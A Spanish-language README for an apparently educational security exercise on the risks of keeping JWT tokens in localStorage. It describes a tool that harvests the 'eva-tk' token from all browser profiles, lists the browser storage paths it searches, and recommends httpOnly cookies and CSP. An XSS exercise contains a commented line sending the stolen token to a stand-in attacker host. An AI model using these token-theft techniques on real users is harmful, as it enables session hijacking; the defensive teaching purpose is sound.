# 🔐 Práctica de Seguridad - eva-tk

Herramientas para demostrar vulnerabilidades del almacenamiento de tokens en localStorage.

## ⚠️ AVISO LEGAL

**SOLO PARA USO EDUCATIVO**

Estas herramientas están diseñadas exclusivamente para:
- Aprender sobre seguridad web
- Probar tu propio sistema y aplicaciones
- Demostrar vulnerabilidades en entornos controlados

**NO uses estas herramientas en sistemas que no te pertenecen.**

---

## 🎯 Objetivo

Demostrar por qué **NO se debe almacenar tokens de autenticación en localStorage** y cómo un atacante podría extraerlos.

### Vulnerabilidades demostradas:

1. **Acceso desde el sistema de archivos** - Los tokens persisten en archivos locales
2. **XSS (Cross-Site Scripting)** - JavaScript malicioso puede leer localStorage
3. **Persistencia** - Los tokens permanecen después de cerrar el navegador
4. **Fácil extracción** - Herramientas simples pueden extraer los tokens

---

## 🛠️ Herramientas incluidas

### 1. JWT Decoder (`jwt-decoder.py`)

Decodifica y analiza tokens JWT, mostrando:
- Header (algoritmo, tipo)
- Payload (datos del usuario)
- Firma
- Análisis de timestamps (emisión, expiración)
- Advertencias de seguridad

**Uso:**
```bash
python3 jwt-decoder.py <token>
```

**Ejemplo:**
```bash
python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYTE5MDAyOTU5Ii..."
```

### 2. LocalStorage Extractor (`extract-localstorage.py`)

Busca y extrae el token `eva-tk` de todos los navegadores instalados.

**Navegadores soportados:**
- Google Chrome (Linux/Windows)
- Chromium
- Microsoft Edge
- Mozilla Firefox (Linux/Windows)

**Perfiles soportados:**
- Todos los perfiles de usuario encontrados
- Múltiples usuarios del sistema

**Uso:**
```bash
python3 extract-localstorage.py
```

El script te pedirá confirmación antes de ejecutarse.

---

## 📋 Guía de uso paso a paso

### Paso 1: Decodificar un token conocido

```bash
cd /home/user/eva-tk/security-practice

# Decodificar el token
python3 jwt-decoder.py "TU_TOKEN_AQUI"
```

Esto te mostrará:
- Los datos dentro del token
- Si el token está expirado
- Advertencias de seguridad

### Paso 2: Extraer tokens de navegadores

```bash
# Ejecutar el extractor
python3 extract-localstorage.py
```

El script:
1. Escaneará todos los navegadores
2. Buscará el token `eva-tk` en localStorage
3. Mostrará los tokens encontrados
4. Guardará los resultados en `extracted-tokens.json`

### Paso 3: Analizar los tokens extraídos

```bash
# Leer el archivo JSON con los tokens
cat extracted-tokens.json

# Decodificar uno de los tokens encontrados
python3 jwt-decoder.py "$(jq -r '.[0].token' extracted-tokens.json)"
```

---

## 🔍 Qué busca el extractor

El script busca en estas ubicaciones:

### Linux

**Chrome/Chromium:**
```
~/.config/google-chrome/*/Local Storage/leveldb/
~/.config/chromium/*/Local Storage/leveldb/
```

**Firefox:**
```
~/.mozilla/firefox/*.*/storage/default/
```

**Edge:**
```
~/.config/microsoft-edge/*/Local Storage/leveldb/
```

### Windows (vía WSL)

**Chrome:**
```
/mnt/c/Users/*/AppData/Local/Google/Chrome/User Data/*/Local Storage/leveldb/
```

**Firefox:**
```
/mnt/c/Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*.*/storage/default/
```

---

## 📊 Ejemplo de salida

### JWT Decoder:
```
======================================================================
🔍 ANÁLISIS DE TOKEN JWT
======================================================================

📋 HEADER:
{
  "alg": "HS256",
  "typ": "JWT"
}

📦 PAYLOAD (Claims):
{
  "user": "a19002959",
  "ida": 1363822,
  ...
}

⏰ TIMESTAMPS:
  Expiration:
    Fecha: 2025-11-21 23:48:16
    Estado: ✓ VÁLIDO

🛡️ ANÁLISIS DE SEGURIDAD:
  Información:
    ℹ️  Algoritmo HS256 (HMAC con SHA-256)
    ✓ Token válido por 1 day, 23:47:01
```

### LocalStorage Extractor:
```
🔍 Buscando tokens en navegadores...

📱 Escaneando Chrome/Chromium...
  • Chrome - Perfil: Default
  • Chrome - Perfil: Profile 1

🎯 RESULTADOS - Encontrados 2 token(s)

📍 Token #1
  Navegador: Chrome
  Perfil: Default
  Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## 🛡️ Lecciones de Seguridad

### 🔴 Problemas con localStorage

1. **Accesible por JavaScript** - Cualquier script puede leer `localStorage`
2. **Vulnerable a XSS** - Un ataque XSS puede robar todos los tokens
3. **Sin protección httpOnly** - No hay forma de marcar como "solo HTTP"
4. **Persistente** - Los datos permanecen hasta que se borren manualmente
5. **Accesible desde archivos** - Como demuestran estos scripts

### ✅ Soluciones recomendadas

#### 1. Usar httpOnly Cookies

```javascript
// ❌ MAL - localStorage
localStorage.setItem('eva-tk', token);

// ✅ BIEN - httpOnly cookie (desde el backend)
res.cookie('eva-tk', token, {
  httpOnly: true,      // No accesible por JavaScript
  secure: true,        // Solo HTTPS
  sameSite: 'strict',  // Protección CSRF
  maxAge: 3600000      // 1 hora
});
```

#### 2. Implementar Content Security Policy

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

#### 3. Tokens de corta duración

```javascript
// Token principal: 15 minutos
// Refresh token: 7 días (en httpOnly cookie)
const accessToken = generateToken({ expiresIn: '15m' });
const refreshToken = generateToken({ expiresIn: '7d' });
```

#### 4. Detectar anomalías

```javascript
// Backend - detectar uso sospechoso
if (tokenUsedFromDifferentIP || tooManyRequests) {
  // Invalidar token y requerir reautenticación
  invalidateToken(token);
  sendSecurityAlert(user);
}
```

---

## 🔧 Mejorando tu aplicación eva-tk

### Migración de localStorage a httpOnly cookies

#### Antes (Inseguro):
```javascript
// Frontend
const token = localStorage.getItem('eva-tk');
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

#### Después (Seguro):
```javascript
// Frontend - La cookie se envía automáticamente
fetch('/api/data', {
  credentials: 'include'  // Incluir cookies
});

// Backend (Node.js/Express)
app.post('/login', (req, res) => {
  const token = generateToken(user);

  res.cookie('eva-tk', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000  // 24 horas
  });

  res.json({ success: true });
});

// Middleware para verificar
app.use((req, res, next) => {
  const token = req.cookies['eva-tk'];
  if (token) {
    try {
      req.user = verifyToken(token);
      next();
    } catch (err) {
      res.status(401).json({ error: 'Token inválido' });
    }
  } else {
    res.status(401).json({ error: 'No autenticado' });
  }
});
```

### Headers de seguridad recomendados

```javascript
// Express.js ejemplo
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

---

## 📚 Recursos adicionales

### Documentación
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Web Storage Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)

### Herramientas de seguridad
- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnerabilidades
- [Burp Suite](https://portswigger.net/burp) - Testing de seguridad web
- [jwt.io](https://jwt.io/) - Decodificador JWT online

---

## 🎓 Ejercicios prácticos

### Ejercicio 1: XSS Simulation
Crea una página de prueba y demuestra cómo un script puede robar tokens:

```html
<!-- Página vulnerable -->
<script>
  // Almacenar token (VULNERABLE)
  localStorage.setItem('eva-tk', 'eyJhbGci...');

  // Script malicioso inyectado
  const stolenToken = localStorage.getItem('eva-tk');
  console.log('Token robado:', stolenToken);
  // fetch('https://atacante.com/steal?token=' + stolenToken);
</script>
```

### Ejercicio 2: Comparar seguridad
Implementa dos versiones de login:
1. Con localStorage (vulnerable)
2. Con httpOnly cookies (seguro)

Intenta robar el token en ambas versiones.

### Ejercicio 3: Token expiration
Implementa un sistema de refresh tokens:
- Access token: 15 minutos
- Refresh token: 7 días
- Rotación automática

---

## ❓ FAQ

**P: ¿Por qué el script no encuentra mi token?**
R: Posibles razones:
- El navegador usa una ruta diferente
- El token tiene otro nombre
- El token expiró y fue eliminado
- El navegador no está ejecutándose (algunos bloquean acceso a archivos)

**P: ¿Es seguro sessionStorage?**
R: Es ligeramente más seguro que localStorage (se borra al cerrar la pestaña), pero sigue siendo vulnerable a XSS. Usa httpOnly cookies.

**P: ¿Cómo sé si mi aplicación es vulnerable?**
R: Si puedes ejecutar este código y obtener el token, eres vulnerable:
```javascript
console.log(localStorage.getItem('eva-tk'));
```

**P: ¿Qué pasa si ya tengo tokens en localStorage?**
R: Planea una migración:
1. Mantén compatibilidad con ambos métodos temporalmente
2. Migra usuarios activos gradualmente
3. Depreca localStorage después de un periodo
4. Invalida tokens antiguos

---

## 🤝 Contribuir

Si encuentras nuevas vulnerabilidades o mejoras:
1. Documenta el hallazgo
2. Crea un ejemplo de código
3. Propón soluciones
4. Actualiza este README

---

## 📝 Licencia

Este material es para uso educativo. Úsalo responsablemente.

---

**Recuerda:** La mejor seguridad es la prevención. Diseña tu aplicación con seguridad desde el inicio, no como una adición posterior.
